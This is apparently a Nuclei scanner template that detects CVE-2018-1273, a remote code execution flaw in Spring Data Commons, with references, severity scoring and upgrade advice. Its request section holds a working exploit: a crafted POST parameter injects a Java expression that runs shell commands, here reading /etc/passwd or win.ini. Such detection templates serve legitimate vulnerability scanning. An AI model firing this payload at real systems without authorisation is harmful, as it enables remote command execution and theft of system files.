id: CVE-2018-1273
info:
  name: Spring Data Commons - Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: The CVE-2018-1273 vulnerability in Spring Data Commons enables a remote
    attacker to execute code by supplying specially crafted request parameters against
    HTTP resources.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1273
  - https://pivotal.io/security/cve-2018-1273
  - http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-1273
    cwe-id: CWE-20
  tags: cve,cve2018,vmware,rce,spring,kev
  metadata:
    impact: The CVE-2018-1273 vulnerability in Spring Data Commons can allow an attacker
      to remotely execute code by exploiting a property binder flaw.
    recommendation: It is recommended to update to Spring Data Commons version 1.13.11,
      2.0.6, or newer to prevent the remote code execution vulnerability caused by
      CVE-2018-1273.
requests:
- raw:
  - 'POST /account HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Content-Type: application/x-www-form-urlencoded


    name[#this.getClass().forName(''java.lang.Runtime'').getRuntime().exec(''{{url_encode(''{{command}}'')}}'')]=nuclei

    '
  payloads:
    command:
    - cat /etc/passwd
    - type C:\/Windows\/win.ini
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
    condition: or
    part: body
